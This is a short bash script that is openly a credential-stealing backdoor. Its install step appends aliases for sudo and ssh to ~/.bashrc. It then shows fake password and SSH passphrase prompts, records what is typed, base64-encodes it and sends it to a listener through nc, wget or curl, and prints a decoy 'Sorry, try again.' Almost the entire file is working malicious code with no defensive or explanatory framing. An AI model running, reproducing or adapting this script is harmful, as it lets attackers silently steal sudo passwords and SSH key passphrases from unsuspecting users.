#!/bin/bash

addr="127.0.0.1"
port="8090"
pssf=".huehue.txt"

# 3 ways of send password
send_pass1="cat $pssf 2> /dev/null | base64 | nc $addr $port &> /dev/null"
send_pass2="wget -q $addr:$port/$(cat $pssf 2> /dev/null | base64)"
send_pass3="curl -s http://$addr:$port//$(cat $pssf 2> /dev/null | base64) > /dev/null"

# install backdoor
if [ "$1" == "install" ]; then
	cp ~/.bashrc ~/.bashrc.bk
	echo alias sudo=\'~/backdoor.sh sudo\' >> ~/.bashrc
	echo alias ssh=\'~/backdoor.sh ssh\' >> ~/.bashrc
	source ~/.bashrc
	echo "[+] backdoor installed.."
	kill -9 $PPID > /dev/null
fi

# get sudo input
if [ "$1" == "sudo" ] && [ -n "$2" ]; then
	printf "[sudo] password for $USER: "
	stty -echo
	read -r password
	echo "$password" >> $pssf
	eval $send_pass1 || eval $send_pass2 || eval $send_pass3
	rm $pssf
	echo -e
	stty echo
	sleep 2
	echo -e "Sorry, try again."
	$@
fi

# get ssh input
if [ "$1" == "ssh" ] && [ -n "$2" ]; then
	printf "Enter passphrase for key \'/home/$USER/.ssh/id_rsa\': "
	stty -echo
	read -r password
	echo "$password" >> $pssf
	eval $send_pass1 || eval $send_pass2 || eval $send_pass3
	rm $pssf
	echo -e
	stty echo
	$@
fi


